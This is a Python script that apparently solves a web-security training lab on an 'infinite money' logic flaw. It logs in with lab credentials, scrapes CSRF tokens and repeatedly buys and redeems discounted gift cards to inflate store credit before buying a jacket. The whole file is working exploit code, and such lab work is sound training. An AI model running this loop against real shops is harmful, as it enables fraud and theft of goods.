"""
Lab: Infinite Money Logic Flaw

Exploitation Steps:
1. Retrieve the CSRF token from the login page.
2. Log in with the credentials: wiener:peter.
3. While the account balance is insufficient, repeat the following sequence to generate money:
    a. POST /cart with productId=2
    b. POST /cart/coupon with code SIGNUP30
    c. POST /cart/checkout
    d. GET /cart/order-confirmation?order-confirmed=true
    e. POST /gift-card using the code generated in the previous step
4. Add the leather jacket to the cart.
5. Proceed to checkout and complete the order.

Author: N00BCYB0T
"""


import argparse
import re
from colorama import Fore
from decimal import Decimal, ROUND_HALF_UP
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None
CSRF_CACHE = {}  # Cache para CSRF tokens

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()

    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    print(f"{Fore.YELLOW}Logging as 'wiener:peter'...{Fore.RESET}")
    data = {
        "username": "wiener",
        "password": "peter"
    }
    login(session, data)

    print(f"{Fore.YELLOW}Generating money through gift card exploitation...{Fore.RESET}")
    while get_store_credit(session) < 1337:
        gift_card_code = buy_gift_card(session)
        if gift_card_code:
            redeem_gift_card(session, gift_card_code)

    print(f"{Fore.YELLOW}Placing the jacket order...{Fore.RESET}")
    place_jacket(session)

    print(f"{Fore.YELLOW}Checking out...{Fore.RESET}")
    order_confirmation(session)

    response = fetch(session, "/cart")
    if "Congratulations, you solved the lab!" in response.text:
        print(f"{Fore.GREEN}[+] Lab solved!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Lab not solved!{Fore.RESET}")

def fetch(session, path):
    try:
        url = path if path.startswith("http") else f"{URL}{path}"
        return session.get(url, allow_redirects=True)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to fetch {path}: {e}{Fore.RESET}")
        exit(1)
     
def get_csrf(session, page, force_refresh=False):
    global CSRF_CACHE
    
    if not force_refresh and page in CSRF_CACHE:
        return CSRF_CACHE[page]
    
    response = fetch(session, page)
    match = re.search(r'csrf\" value=\"(.+?)\"', response.text)
    if not match:
        print(f"{Fore.RED}[-] CSRF token not found!{Fore.RESET}")
        exit(1)
    
    token = match.group(1)
    if token != CSRF_CACHE.get(page):  # Só mostra se mudou
        print(f"{Fore.GREEN}[+] Found CSRF Token: {token} | Page: {page}{Fore.RESET}")
    
    CSRF_CACHE[page] = token
    return token

def login(session, data):
    csrf_token = get_csrf(session, "/login")
    data['csrf'] = csrf_token
    try:
        session.post(f"{URL}/login", data=data, allow_redirects=False)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to login: {e}{Fore.RESET}")
        exit(1)

def place_jacket(session):
    try:
        url = f"{URL}/cart"
        data = {
            "productId": 1,
            "redir": "PRODUCT",
            "quantity": 1
        }
        session.post(url, data, allow_redirects=False)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to place the jacket: {e}{Fore.RESET}")
        exit(1)

def get_store_credit(session):
    response = fetch(session, "/my-account")
    match = re.search(r"Store credit: \$(\d+\.\d{2})", response.text)
    if match:
        return float(match.group(1))
    return 0

def buy_gift_card(session):
    try:
        data = {
            "productId": 2,
            "redir": "PRODUCT",
            "quantity": 1
        }
        session.post(f"{URL}/cart", data=data)
        
        response = order_confirmation(session)
        match = re.search(r'<tr>\s*<th>Code</th>\s*</tr>\s*<tr>\s*<td>(\w+)</td>\s*</tr>', response.text)
        if match:
            code = match.group(1)
            print(f"{Fore.GREEN}[+] Got gift card code: {code}{Fore.RESET}")
            return code
        else:
            print(f"{Fore.RED}[!] Failed to find gift card code in response{Fore.RESET}")
            print(f"{Fore.YELLOW}Response content: {response.text}{Fore.RESET}")
            return None
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to buy gift card: {e}{Fore.RESET}")
    return None

def redeem_gift_card(session, code):
    try:
        csrf_token = get_csrf(session, "/my-account", force_refresh=False)
        result = session.post(
            f"{URL}/gift-card",
            data = {
                "csrf": csrf_token,
                "gift-card": code
            }    
        )
        if result.status_code == 200:
            print(f"{Fore.GREEN}[+] Successfully redeemed gift card: {code}{Fore.RESET}")
            print(f"{Fore.GREEN}[+] Current balance: ${get_store_credit(session)}{Fore.RESET}")
        else:
            # Se falhou, tenta atualizar o token e tentar novamente
            if result.status_code == 403:
                csrf_token = get_csrf(session, "/my-account", force_refresh=True)
                result = session.post(
                    f"{URL}/gift-card",
                    data = {
                        "csrf": csrf_token,
                        "gift-card": code
                    }    
                )
                if result.status_code == 200:
                    print(f"{Fore.GREEN}[+] Successfully redeemed gift card: {code}{Fore.RESET}")
                    print(f"{Fore.GREEN}[+] Current balance: ${get_store_credit(session)}{Fore.RESET}")
                    return
            print(f"{Fore.RED}[!] Failed to redeem gift card: Status code {result.status_code}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to redeem gift card: {e}{Fore.RESET}")

def order_confirmation(session):
    csrf_token = get_csrf(session, "/cart", force_refresh=False)

    session.post(
        f"{URL}/cart/coupon",
        data = {
            "csrf": csrf_token,
            "coupon": "SIGNUP30"
        }
    )

    session.post(
        f"{URL}/cart/checkout", 
        data={
            "csrf": csrf_token
        }, 
        allow_redirects=False
    )

    return session.get(
        f"{URL}/cart/order-confirmation", 
        params={
            "order-confirmed": True
        }
    )

if __name__ == "__main__":
    main()
